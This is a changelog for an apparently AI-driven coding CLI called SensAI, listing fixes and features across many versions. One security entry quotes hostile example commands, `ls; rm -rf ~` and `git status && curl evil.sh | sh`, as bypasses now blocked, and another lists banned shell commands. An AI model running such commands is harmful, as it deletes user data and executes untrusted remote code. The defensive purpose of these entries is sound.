## v0.2.54

### Core
- Fix transient stream failures (EOF, INTERNAL_ERROR, network errors) silently aborting Plan mode phases — the proxy now retries up to 3 times when nothing has been emitted to the client yet, so single-blip stream errors recover without user intervention

### TUI
- Add MCP server "Add" form to the management dialog (`/mcp` or command palette → "Manage MCP Servers"): enter a name, pick transport type (stdio/sse/http) with ←/→, then provide a command+args or URL; the server is persisted and connected immediately. Title bar now shows `N/M active` server count

## v0.2.53

### Core
- Fix Claude streaming reliability — replaced the Converse API client with the native Anthropic SDK, eliminating repeated `stream error: INTERNAL_ERROR` failures on long tool calls (e.g. large `write_file`), double-counted token usage, and dropped reasoning effort on Opus 4.6/4.7/Sonnet 4.6
- Fix GPT-5 tool calls failing with "Please use /v1/responses instead" — the proxy now routes `gpt-5*` requests with function tools through OpenAI's `/v1/responses` endpoint and translates the response back to Chat Completions format transparently

### TUI
- Add MCP server management dialog (command palette → "MCP"): filter servers by name, toggle enabled/disabled with `enter`/`space`, restart a server with `r`, remove it with `x`/`delete`; rows show transport type, connection state (connected/starting/error/disabled), and tool/prompt counts when connected

### Infrastructure
- Update Go dependencies to latest versions

## v0.2.52

### Security
- Fix partial keyring writes leaving a fresh access token paired with a stale refresh token — all three keyring items (access token, refresh token, metadata) are now written atomically with rollback on failure
- Fix multiple SensAI instances racing to refresh the same expired token and invalidating each other's newly-issued refresh tokens — refresh is now serialized within the process and skips the network call when the on-disk token is already valid
- Reject malformed image attachments (corrupt PNG/JPEG/GIF/WebP) before they reach the provider — truncated or garbage payloads are dropped with a clear error instead of causing an irrecoverable provider 400
- Fix permission grant race where a fast-follow request for the same tool/action/path could re-prompt instead of auto-approving — granted entries are now persisted before the notification fires
- Replace O(n) permission scan with O(1) keyed map lookup so per-turn auth checks no longer slow down as approvals accumulate
- Add `allowed_tools` whitelist support for MCP servers — when set, only the listed tools are exposed to the agent; configurable via `sensai-cli mcp add --allowed-tools tool1,tool2` or config

### Models
- Add OpenAI GPT-5.5, GPT-5.4, and GPT-5.3 Codex to the model catalog — GPT-5.5 and GPT-5.4 support Sense mode (>272K long-context pricing) and reasoning effort (none/low/medium/high/xhigh); GPT-5.3 Codex always reasons (low/medium/high/xhigh)

### Core
- Add full lifecycle hook system with 14 event types: run shell commands or trigger agents on tool calls (`pre_tool_use` / `post_tool_use`), file changes (`file_edited` / `file_created` / `file_deleted`), user input (`prompt_submit`), session end (`agent_stop`), manual trigger (`user_triggered`), and spec task transitions (`pre_task_execution` / `post_task_execution`). `pre_tool_use` hooks can block or rewrite tool calls before dispatch. Tool-type matchers support built-in categories (`read`, `write`, `shell`, `web`, `spec`, `*`) or regex against tool name. Hook data is exposed as `SENSAI_HOOK_<KEY>` env vars; `{{key}}` placeholder interpolation supported in command/prompt fields. Circular-fire detection prevents infinite loops. Config: `[[hooks]]` blocks in `~/.sensai/config.toml` or `.sensai/config.toml`
- Add two built-in skills compiled into the binary: `sense-config` (TOML/JSON config schema reference) and `sense-hook` (hook events, action types, common patterns) — available out of the box without copying skill folders; disable via `options.disabled_skills`; user-authored skills with the same name override the built-in
- Embed jq into the shell interpreter — `cat data.json | jq '.foo'` now works cross-platform without a separate jq install; supports `-r`, `-R`, `-s`, `-c`, `-n`, `-e`, `--arg`, `--argjson`, and combined short flags
- Add `sense_info` tool: returns a JSON snapshot of active models, providers, MCP/LSP servers, compression level, and disabled tools/skills (sensitive values redacted to `has_api_key`/`has_oauth` booleans)
- Add `sense_logs` tool: returns the tail of `sensai.log` with optional `tail` and `level` filters for self-debugging "why isn't X working?" questions
- Support `$(command)` substitution in config values — e.g. `api_key = "$(vault kv get secret/sensai)"` for vault integration without exposing secrets to the filesystem; 5-minute timeout enforced per command
- Fix session resume failing when a prior session was cancelled mid-tool-call — synthetic `tool_result` blocks are now injected for any orphaned `tool_use` IDs so providers no longer reject the next request with a 400
- Fix image attachments sent to models that don't support images — attachments and binary file parts are stripped from prompts and history when the active model has `supports_images = false`, so switching from a vision model to a text-only model mid-session no longer errors
- Fix `reasoning_effort` being sent to non-reasoning models and causing 400s from stricter providers
- Fix `max_tokens = 0` causing 400s from local model servers (LM Studio, older OpenAI-compat backends) — the field is now omitted when zero or unset
- Fix stale queued messages replaying on the continuation session after auto-summarization — the queue is cleared on the old session; summarization errors now surface to the UI instead of leaving the spinner running
- Fix Grok 4.3 tool calls failing after any tool is in history — requests now go through `/v1/chat/completions` directly with `reasoning_effort` passed through instead of the Responses API, which rejected chat-completions-shaped messages
- Fix "none" reasoning level missing from the live catalog for models like Grok 4.3, GPT-5.5, and GPT-5.4 that support disabling reasoning
- Fix long-running Claude tool calls (e.g. large `write_file`) hitting repeated stream errors on AWS Bedrock by forcing HTTP/1.1 — eliminates the `stream error: INTERNAL_ERROR; received from peer` failures that caused the agent to retry the same large payload indefinitely
- Fix `todos` tool causing the agent to stop after updating a task instead of immediately continuing with the next in-progress action in the same turn — strengthened end-of-turn invariant requiring every finished task to be flipped to `completed` before stopping
- Cap `job_output` tool at 30 KB (first 15 KB + last 15 KB) so long-running background commands can't fill the context window
- Cap `web_fetch` HTML-to-markdown output at 100 KB — use `download_file` for larger payloads
- Fix LSP server permanently disabled after a transient startup failure — replaced sticky unavailable cache with a 5-minute retry backoff so installs in progress recover automatically
- Fix `find_files` errors returned as Go errors — now returned as tool-level error responses so the model can adjust the pattern or path on failure
- Fix image MIME type detection when the file extension is missing or misleading — magic bytes are now sniffed so a `.jpg` that is actually a PNG loads correctly
- Fix stale LSP diagnostics shown after a file edit — the diagnostic snapshot for an edited URI is now cleared immediately so the auto-diagnose loop doesn't see pre-edit errors while the language server recomputes
- Fix UTF-8 BOM in `SKILL.md` files silently excluding skills from discovery on Windows and CJK-locale systems
- Fix Windows CRLF in pasted content carrying stale `\r` bytes into prompts and attachments
- Hint the model about available helper CLIs (`gh`, `rg`) in the system prompt when they are present in `$PATH`
- Resolve the data directory to an absolute path during config load so Git worktrees, symlinked checkouts, and relative `data_directory` overrides all land at the same place

### TUI
- Add "Manage Hooks" dialog (command palette → "Manage Hooks"): filterable list of all configured hooks with enabled/disabled status dots, event type, and description; `enter`/`space` toggles a hook on/off; `x` deletes it; changes persist immediately
- Auto-detect unified-diff output from MCP tools and the generic tool renderer — output matching `@@` hunk headers is now rendered with the diff highlighter instead of as plain text

### CLI
- Add `sensai-cli hooks` command group: `list`, `create`, `toggle`, `delete`, and `run` subcommands for managing lifecycle hooks from the terminal; `--workspace` flag scopes changes to the project config

### Infrastructure
- Fix SQLite `SQLITE_BUSY` and occasional corruption under concurrent sub-agent writes by forcing all transactions to begin with `BEGIN IMMEDIATE`
- Raise pubsub channel buffer from 64 → 4096 to prevent event drops under bursty load (concurrent sub-agents, MCP discovery, LSP diagnostics)

## v0.2.51

### Security
- Tighten `run_shell` safe-read-only classifier with AST-level metacharacter detection — commands like `ls; rm -rf ~` or `git status && curl evil.sh | sh` no longer bypass the permission prompt
- Remove `kill` and `killall` from the read-only safe-list so process-killing always prompts for permission
- Cap `download_file` size at 100 MB by default (configurable via `max_bytes`, hard cap 1 GB); oversized `Content-Length` headers are rejected up front
- Move `web_fetch` large-page temp files to `~/.sensai/cache/web/` so they no longer pollute git status

### Core
- Add `web_search` tool fallback via the SensAI proxy
- Add `apply_patch` tool: applies multi-file unified diffs (modify, create, delete, rename) atomically with snapshot-based undo
- Add `delete_file`, `move_file`, and `make_dir` tools so common file operations no longer require shelling out
- Add `git_log` (structured commit history) and `git_commit` (Conventional Commits-validated, never amends/pushes/sets config) tools
- Add `scan_secrets` tool so the agent can audit text or files before writing or committing; results are redacted
- Add `http_request` tool with full verb support (POST/PUT/PATCH/DELETE/HEAD/OPTIONS) for webhook/API debugging, capped at 2 MB response
- Replace the `code_review` stub with a real implementation that dispatches a read-only review sub-agent
- Fix `patch_file` `replace_all` returning a misleading "no changes made" error when the search string is missing
- Improve `read_file` long-line truncation to explicitly call out truncated lines so the model doesn't use them as edit anchors
- Make `read_file` LSP diagnostics wait opt-in via `wait_for_diagnostics`; default is now no wait, removing per-read latency for bulk reads
- Raise `write_file` size cap from 50 KB to 256 KB
- Skip the random search-throttling delay on the first `web_search` call

### CLI
- Switch every built-in tool's HTTP `User-Agent` to `sensai-cli/<version>` for server-side request attribution

## v0.2.50

### Core
- Add user-selectable reasoning effort for Grok 4.3: choose `none` (3 credits), `low` (4), `medium` (6), or `high` (8) via the `/reasoning` slash command
- Fix file-write tool calls retrying with the same large payload after upstream stream errors — the model now sees the real provider error (e.g. Bedrock stream timeout on a large write) and can switch to incremental edits on the next turn

### Infrastructure
- Updated 2 Go dependencies to latest versions

## v0.2.49

### Infrastructure
- Updated 5 Go dependencies to latest versions

## v0.2.48

### TUI
- Fix compression level picker showing truncated/missing level names (Lite, Full, Ultra, Auto)
- Redesign `@` file and `/` slash command completions popup: gold rounded border, separator between list and query input, bold query text with block cursor, gold prefix label, and muted placeholder when no filter is typed
- Add mouse-clickable `✕` remove button to each attachment chip in the editor prefix row
- Fix re-attach broken after keyboard or mouse removal: the same file can now be re-added in the same session after removing it

### CLI
- Add `sensai-cli uninstall` command: removes stored credentials, deletes `~/.sensai/`, and removes the binary; prompts for confirmation before acting, `--force` skips prompts
- Restyle `sensai-cli --help` output to match the SensAI design system: brand gold for section titles, consistent text scale throughout
- Group the root `--help` listing into four scannable sections: Chat, Account, Project, and System

## v0.2.47

### Core
- Expand compression injection to sub-agent and task prompts so every non-security prompt path respects the compression setting
- Add `level = "auto"`: compression scales with live context usage (lite <50%, full 50–80%, ultra ≥80%)
- Add per-mode compression overrides (`compression.modes.code|plan|chat|analyze|security`): empty inherits global, `"off"` disables for that mode; security mode is always off
- Strengthen compression safeguards: URLs, regex patterns, env var names, commit messages, and structured payloads (JSON, YAML, TOML, XML, diffs, patches) are protected from abbreviation

### TUI
- Expand `/compress` command: `on`, `off`, `cycle`, `show`, and `auto` subcommands; `cycle` rotates off → lite → full → ultra → auto → off; `show` prints the current compression block being injected
- Add "Auto" entry and level samples to the compression picker dialog (e.g. "cfg loaded. ok. no errs." for ultra)
- Drop the "(compress off)" suffix from the editor info bar — the level indicator now only appears when compression is enabled, matching how `(Sense)` behaves

### Infrastructure
- Update 14 Go dependencies to latest versions including `golang.org/x/crypto`, `golang.org/x/net`, `ncruces/go-sqlite3`, `tidwall/gjson`, and charmbracelet packages

## v0.2.46

### Core
- Auto-install Node via nvm when `ast_search` cannot find npm to install ast-grep

### Billing
- Correct xAI token pricing to match current published rates — Grok 4.20 family input/output reduced, Grok Code Fast output corrected
- Track cached input tokens separately so cache hits bill at the reduced cached rate instead of full input price

### Infrastructure
- Upgrade Go 1.26.2 → 1.26.3 (8 stdlib CVE fixes)
- Update 5 Go dependencies to latest versions

## v0.2.45

### Core
- Fix `credits used` line diverging from the database on multi-step turns and over-counting on subsequent turns when a prior turn ended on a tool call — the coordinator now emits a single aggregated turn-completed notification so the TUI line matches the sum of per-step usage log entries exactly
- Fix `todos` tool causing the agent to stop after updating the todo list instead of continuing with the next in-progress action in the same turn

### Infrastructure
- Update Go dependencies to latest versions

## v0.2.44

### Core
- Fix Claude retries failing after a canceled or failed tool call — the adapter now synthesizes a matching `tool_result` for any orphaned `tool_use` block before replaying history so Converse/ConverseStream no longer rejects the request

### TUI
- Animate the `Sensing…` indicator with a brand-gold braille spinner, bold label, and cycling ellipsis on a 100 ms tick so the main-agent line stays visually alive for the full turn
- Fix `credits used` line under-reporting the turn cost for multi-step turns — credits from intermediate tool-use steps are now correctly merged into the final total

## v0.2.43

### TUI
- Show a single `credits used` line per user turn instead of one after every intermediate tool-use step
- Fix diff line colored background gaps when chroma emits unstyled tokens (whitespace, punctuation)
- Tick the `Sensing…` indicator with a live elapsed timer so the main agent's progress is always visible

## v0.2.42

### Core
- Fix social login failing with `bad_oauth_state` and redirecting to Supabase's localhost site URL
- Fix context percentage regressing to near-zero after the first step of a new turn by tracking the high-water mark of prompt tokens and counting cache-creation tokens toward context size

### TUI
- Brand the in-flight main-agent indicator as `Sensing…` in the editor prefix panel and textarea placeholder rotation
- Fix diff line coloring so line number background matches the code/symbol background for insert and delete rows

## v0.2.41

### Core
- Fix social login redirects falling back to default localhost callback so GitHub and Google sign-in return to the correct SensAI login flow

### TUI
- Show the main agent as running in the Agents status row while long turns are still in progress

### Billing
- Report credits per assistant response so multi-step turns, failed non-canceled steps, tool-error recovery, and auto-diagnose follow-ups each show their own credit line and usage log entry

## v0.2.40

### Core
- Fix browser login completion when an OAuth provider returns the code to the local callback listener root path instead of `/callback`

### TUI
- Fix sidebar scrolling in dense sessions so the expanded sidebar responds reliably to mouse-wheel input
- Collapse the Modified Files list after seven entries and let it expand inline when you need the full set

### Billing
- Fix per-message credit usage so assistant info lines and usage logs report only the current turn's token usage and tool calls instead of accumulating prior session tool calls

## v0.2.39

### Core
- Add Security Mode for eligible Sense Pro users with the Security Mode add-on, using the Aegis security audit workflow and a read-only audit tool policy
- Add Grok 4.3 to the model catalog with Sense mode support
- Fix Sense Mode staying off after restart even when it was enabled previously
- Fix Claude write reliability and stuck compaction by surfacing Bedrock stream errors and bounding summarization work

### TUI
- Add Security Mode switching through `/security` and the command palette when the account has the required entitlement
- Hide Security Mode entry points for accounts without Sense Pro plus the Security Mode add-on
- Improve sidebar usability in dense sessions with a wider layout and independent scrolling while keeping long lists accessible

### Billing
- Add feature entitlement support so paid add-ons such as Security Mode can be granted separately from the base subscription tier
- Use Sense-specific token prices, including cached input pricing, when calculating credits for Sense-mode turns

### Infrastructure
- Update Go dependencies to latest compatible releases

## v0.2.38

### Core
- Improve search and startup responsiveness, including faster search and less delay before turns begin
- Fix file write and edit tools reporting failure after a successful write when history syncing fails
- Fix runtime selection persistence across launches so model, reasoning effort, Sense mode, compression, and related preferences survive restarts
- Fix first-run workspace bootstrap so local `.sensai/skills` are discovered and empty `skills/` and `rules/` directories are created automatically

### TUI
- Improve long-session redraw performance for chat and markdown-heavy sessions
- Fix authenticated startup sometimes missing the update dialog

### Billing
- Fix monthly credit resets across billing cycles so stale optimistic usage does not carry into the new period

## v0.2.37

### Core
- Fix Claude tool calls rendering as raw `<tool_use>` blocks instead of native tool UI
- Fix Claude token usage not appearing in the sidebar by forwarding usage metadata

## v0.2.36

### Core
- Fix Sense mode on Grok 4.20 using the wrong context window — Sense now uses the full 2M window while standard mode still respects the lower threshold
- Improve oversized request handling for large chats and contexts with a clearer actionable "request too large" error
- Load `.sensai/rules/` as per-file Markdown rules while keeping legacy `.sensai/rules.md` support

### TUI
- Fix `/compress` changes not taking effect immediately — compression updates now apply to the next turn without restarting
- Update Rules management to treat each Markdown file in a rules directory as a separate rule, including per-file enable/disable state

### CLI
- Update `sensai-cli ctx` to count rule files inside rules directories individually and skip disabled rules

## v0.2.35

### Core
- Fix Opus 4.7 failing with "thinking.type.enabled is not supported" — now uses adaptive thinking with effort control
- Fix model name stuck as previous model after switching (e.g. showing "grok-4.20-reasoning" after switching to Claude)

## v0.2.34

### Core
- Fix Bedrock adaptive thinking errors on all Claude models
- Fix system prompt showing wrong model name when using Claude models

## v0.2.33

### Core
- Fix auto-summarize triggering against full context window instead of effective threshold when Sense mode is disabled on a Sense-capable model
- Fix model IDs causing "The provided model identifier is invalid" errors for all Claude models
- Fix "reasoning model `max` not supported" error on Opus 4.7 and Sonnet 4.6
- Remove `max` reasoning level from Opus 4.7 and Sonnet 4.6
- Remove `xhigh` reasoning level from Opus 4.7

### TUI
- Show update-available dialog to authenticated users who previously missed it by skipping the welcome screen

### Infrastructure
- Updated 11 Go dependencies to latest versions

## v0.2.32

### Core
- Add reasoning effort selection for Claude Opus 4.6, Opus 4.7, and Sonnet 4.6 — choose low/medium/high/xhigh/max via the same reasoning effort dialog used by xAI models

## v0.2.31

### Infrastructure
- Minor code quality improvements

## v0.2.30

### Core
- Add Chat Mode: zero-tools conversation mode for freeform discussion without tool use
- Add token compression system with three levels (`lite`, `full`, `ultra`) to reduce output verbosity
- Add Skills discovery and management with enable/disable toggle, GitHub import, and local folder import
- Add Rules management for context rule files with enable/disable toggle and import support
- Add `SENSAI.md` priority chain: checks `SENSAI.md` first, then `AGENTS.md`; only the first found is loaded. `DESIGN.md` is always loaded when present as an additive context file
- Add `/create-sensai` command to generate `SENSAI.md` from existing AI-assistant files (`CLAUDE.md`, `GEMINI.md`, etc.)
- Fix race condition in concurrent map operations that could cause duplicate initialization
- Fix symlink resolution in write-path guard propagating errors instead of silently swallowing them
- Fix context path dedup skipping valid files on case-sensitive filesystems

### TUI
- Add `/chat` and `/code` slash commands for switching between Chat Mode and Code Mode
- Add `/compress` slash command to toggle compression and set level (`lite`/`full`/`ultra`)
- Add compression level picker dialog when enabling compression
- Add Skills sidebar section with green/red status dots for valid/invalid skills
- Add Rules sidebar section showing active context rule files
- Add Skills management dialog (Ctrl+P → "Manage Skills")
- Add Rules management dialog (Ctrl+P → "Manage Rules")
- Add "Create SENSAI.md" to the command palette
- Add sort toggle to model picker: press `tab` to switch between "by provider" and "sorted by price"
- Change Shift+Tab mode toggle to Code→Plan→Chat→Code 3-way cycle
- Add Code Mode, Chat Mode, and Toggle Compression to the command palette
- Add startup check suggesting `/create-sensai` when no primary context file exists
- Fix model picker price text invisible when item is focused
- Fix "NEW" badge breaking the gold row background when focused

### Models
- Add four Anthropic Claude models: Claude Haiku 4.5, Claude Sonnet 4.6, Claude Opus 4.6, Claude Opus 4.7
- Add Anthropic as a supported provider alongside xAI in the model picker
- Unify tier access: all models except `grok-code-fast` available on all paid tiers
- Fix multiple issues with Claude models appearing under wrong provider

### Billing
- Add cached token billing: cached input tokens now billed at reduced provider cache-read rate
- Enable Sense mode for Claude Sonnet 4.6 and Opus 4.6/4.7 (1M context, no long-context surcharge)
- Reduce base multipliers across all models for lower per-turn credit costs

### Infrastructure
- Updated 60+ dependencies including security patches

## v0.2.29

### Security
- Fix broken MCP secret redaction — secrets were not being replaced in tool responses
- Replace hardcoded file-keyring fallback password with machine-derived key
- Fix MFA state race condition where concurrent logins could overwrite PKCE verifiers
- Add OAuth state parameter for CSRF protection on login flows
- Fix OAuth state parameter not threaded through proxy login — caused "state mismatch" on every login
- Add AST-level shell command blocking for subshells, pipes, and command substitution
- Add `eval`, `source`, `xargs`, `nohup`, `strace`, `ltrace`, and `env` to banned shell commands
- Add decompression bomb protection to self-update (500 MB cap)
- Install script now fails when no checksum tool is available instead of skipping verification
- Expand secrets scanner with 8 new patterns (Stripe, GCP, Azure, Anthropic, Supabase, Twilio, SendGrid)
- Add symlink resolution to write/edit path guard — prevents symlink-based path traversal
- Add symlink resolution to view tool workspace boundary check
- Add 30-minute maximum lifetime to background shell jobs
- Add `SENSAI_BASE_URL` non-HTTPS warning when auth tokens may be sent in cleartext

### Core
- Add SQLite connection pool tuning — reduces lock contention under concurrent writes
- Fix proxy request body re-buffered on every retry — now buffered once for zero-copy retries
- Make LSP diagnostic collection concurrent with shared 15s deadline
- Add bounded message queue (50 pending messages per session)
- Add large-file spill-to-disk in checkpoint tracker (files >256 KB written to temp)

### TUI
- Fix credit banner double-counting credits during multi-turn sessions
- Fix context percentage showing against full 2M window instead of effective threshold

### CLI
- Add release notes transform pipeline with categorized output for GitHub releases
- Switch install and self-update downloads to GitHub Releases (proxy as fallback)
- Fix install script 404 when downloading from proxy by defaulting to correct base URL
